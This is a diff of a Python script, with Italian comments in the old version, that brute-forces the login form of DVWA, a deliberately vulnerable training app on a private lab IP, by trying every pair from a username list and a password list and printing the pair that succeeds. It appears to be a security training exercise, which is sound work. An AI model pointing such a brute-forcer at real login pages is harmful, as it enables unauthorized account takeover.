@@ -1,25 +1,56 @@
-import http.client, urllib.parse       #si importano i moduli
+import http.client, urllib.parse
 
-lista_username = open("usernames.lst") # definiamo le variabili con all'interno la lista degli usernames
-lista_password = open("passwords.lst") # definiamo le variabili con all'interno la lista delle passwords
+def main():
 
-user = lista_username.readlines()      #copiamo il contenuto del file lista_username nella variabile user
-password = lista_password.readlines()  #Facciamo lo stesso per il file lista_password nella variabile password.
+    lista_username = open("usernames.lst")
 
-for usr in user:                       #creiamo un ciclo che ci permette di usare le liste in password e in user 
-    usr = usr.rstrip()
-    for pwd in password:
+    lista_password = open("passwords.lst")
 
-        pwd = pwd.rstrip()
 
-        print(usr, "-",pwd)            # mostra a schermo lo username e la password
 
-        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':"Login"})  
-        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"} 
-# qui sono stati definitii parametri necessari al funzionamento della libreria importata
-        conn = http.client.HTTPConnection("192.168.50.101") #ci connettiamo all'indirizzo ip di riferimento con la porta di default 80         
-        conn.request("POST", "/dvwa/login.php", post_parameters, headers) # raggruppiamo i parametri al comando CONN.REQUEST 
-        response = conn.getresponse() # ci mettiamo in comunicazione con il server e ne raccogliamo la risposta
+    user = lista_username.readlines()
 
-        if(response.getheader("location")) == "index.php": # se riusciamo ad accedere con le credenziali ci porta alla pagina di login
-            print("Logged with: ", usr, " - ",pwd) # il programma ci avvisa che siamo riusciti a trovare le credenziali corrette e ce le printa
+    password = lista_password.readlines()
+
+    
+
+    for usr in user:
+
+        usr = usr.rstrip()
+
+        for pwd in password:
+
+            pwd = pwd.rstrip()
+
+            brute(usr,pwd)
+
+        #print(usr, "-",pwd)
+
+def brute(usr,pwd): 
+
+        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':"Login"})
+
+        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
+
+        conn = http.client.HTTPConnection("192.168.50.101")
+
+        conn.request("POST", "/dvwa/login.php", post_parameters, headers)
+
+        response = conn.getresponse()
+
+
+
+        #print(response.getheader("location"))
+
+
+
+        if(response.getheader("location")) == "index.php":
+
+            print("Logged with: ", usr, " - ",pwd)
+
+            print("Operazione completata con successo")
+
+if __name__ == "__main__":
+
+    main()
+
